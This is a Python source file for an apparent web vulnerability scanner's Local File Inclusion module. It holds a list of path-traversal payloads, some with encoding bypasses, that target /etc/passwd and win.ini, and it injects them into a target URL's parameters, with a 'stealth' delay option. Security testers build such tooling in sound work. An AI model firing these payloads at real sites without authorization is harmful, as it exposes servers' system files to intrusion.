from core.scanner import BaseScanner
from typing import Dict, List, Optional
import asyncio

class LFIScanner(BaseScanner):
    """Local File Inclusion vulnerability scanner"""
    
    def __init__(self, session, target: str, stealth: bool = False):
        super().__init__(session, target, stealth)
        self.payloads = self._load_payloads()
        
    def _load_payloads(self) -> List[str]:
        """Load LFI payloads"""
        return [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "../../../etc/passwd%00",
            "../../../../../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..;/..;/..;/etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd"
        ]
        
    async def scan(self) -> List[Dict]:
        """Execute LFI scan"""
        if '?' in self.target:
            await self._test_url_parameters()
            
        return self.results
        
    async def _test_url_parameters(self):
        """Test URL parameters for LFI"""
        base_url, params = self.target.split('?', 1)
        param_pairs = [p.split('=', 1) for p in params.split('&')]
        
        for param_name, param_value in param_pairs:
            for payload in self.payloads:
                test_params = {param_name: payload}
                test_url = self._build_url(base_url, test_params)
                
                result = await self.test_payload(payload, test_url)
                if result:
                    self.add_result(
                        'Local File Inclusion (LFI)',
                        'HIGH',
                        test_url,
                        f"Parameter '{param_name}' vulnerable with payload: {payload}"
                    )
                    break
                    
                await asyncio.sleep(0.1 if self.stealth else 0)
                
    async def test_payload(self, payload: str, url: str) -> Optional[Dict]:
        """Test LFI payload"""
        response = await self.http_client.get(url)
        
        if response:
            is_vulnerable = self.validator.validate_lfi(
                response.text,
                payload
            )
            
            if is_vulnerable:
                return {'vulnerable': True, 'payload': payload}
                
        return None
        
    def _build_url(self, base_url: str, params: Dict) -> str:
        """Build URL with parameters"""
        param_string = '&'.join([f"{k}={v}" for k, v in params.items()])
        return f"{base_url}?{param_string}"
